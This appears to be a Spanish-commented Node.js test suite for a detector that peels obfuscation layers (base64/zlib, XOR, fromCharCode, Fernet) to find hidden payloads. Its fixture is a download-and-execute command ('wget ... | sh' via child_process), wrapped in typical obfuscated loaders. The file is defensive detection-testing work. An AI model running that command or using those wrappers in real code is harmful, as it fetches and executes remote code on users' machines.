'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('zlib');
const crypto = require('crypto');
const { findHiddenPayloads, fernetDecrypt, looksLikeCode, sniffBinary, peel } = require('../lib/decoder');

const PAYLOAD = 'require("child_process").exec("wget http://203.0.113.7/p -O- | sh")';
const b64url = (b) => b.toString('base64').replace(/\+/g, '-').replace(/\//g, '_');

// Cifrado Fernet de referencia (solo para generar el caso de prueba).
function fernetEncrypt(key, plain) {
  const iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-128-cbc', key.subarray(16), iv);
  const body = Buffer.concat([Buffer.from([0x80]), Buffer.alloc(8), iv, c.update(plain), c.final()]);
  return b64url(Buffer.concat([body, crypto.createHmac('sha256', key.subarray(0, 16)).update(body).digest()]));
}

test('looksLikeCode necesita al menos dos pistas distintas', () => {
  assert.equal(looksLikeCode(PAYLOAD), true);
  assert.equal(looksLikeCode('hola mundo, esto es texto normal'), false);
  assert.equal(looksLikeCode('return return return'), false);
});

test('pela base64 sobre zlib', () => {
  const src = `eval(require("zlib").inflateSync(Buffer.from("${zlib.deflateSync(PAYLOAD).toString('base64')}","base64")).toString())`;
  const [r] = findHiddenPayloads(src);
  assert.ok(r, 'debe encontrar el payload');
  assert.equal(r.final, 'text');
  assert.match(r.text, /child_process/);
  assert.ok(r.layers.includes('base64'));
});

test('descifra XOR de un byte por fuerza bruta', () => {
  const hex = Buffer.from(PAYLOAD).map((b) => b ^ 0x5a).toString('hex');
  const [r] = findHiddenPayloads(`d = bytes.fromhex("${hex}")\nexec(bytes(b ^ 0x5a for b in d))\n`);
  assert.ok(r);
  assert.match(r.text, /child_process/);
  assert.ok(r.layers.some((l) => /XOR clave 0x5a/.test(l)));
});

test('decodifica String.fromCharCode', () => {
  const [r] = findHiddenPayloads(`eval(String.fromCharCode(${Buffer.from(PAYLOAD).toJSON().data.join(',')}))`);
  assert.ok(r);
  assert.match(r.text, /child_process/);
});

test('descifra Fernet con la clave embebida y rechaza una clave incorrecta', () => {
  const key = crypto.randomBytes(32);
  const token = fernetEncrypt(key, Buffer.from(PAYLOAD));
  assert.equal(fernetDecrypt(b64url(key), token).toString(), PAYLOAD);
  assert.equal(fernetDecrypt(b64url(crypto.randomBytes(32)), token), null);

  const [r] = findHiddenPayloads(`from cryptography.fernet import Fernet\nk = b"${b64url(key)}"\nexec(Fernet(k).decrypt(b"${token}"))\n`);
  assert.ok(r);
  assert.match(r.text, /child_process/);
  assert.match(r.layers[0], /Fernet/);
});

test('marca un token Fernet sin clave como no descifrable', () => {
  const token = fernetEncrypt(crypto.randomBytes(32), Buffer.from(PAYLOAD));
  const [r] = findHiddenPayloads(`from cryptography.fernet import Fernet\nexec(Fernet(load_key()).decrypt(b"${token}"))\n`);
  assert.ok(r);
  assert.equal(r.final, 'opaque');
});

test('reconoce ejecutables por su cabecera', () => {
  assert.ok(sniffBinary(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64)])));
  assert.ok(sniffBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0, 0, 0])));
  assert.equal(peel(Buffer.from('texto plano normal y corriente'), 'x').final, 'text');
});

test('no da falsos positivos con base64 corriente', () => {
  const img = `const logo = "data:image/png;base64,${crypto.randomBytes(300).toString('base64')}";`;
  assert.deepEqual(findHiddenPayloads(img).filter((r) => r.final === 'text'), []);
});
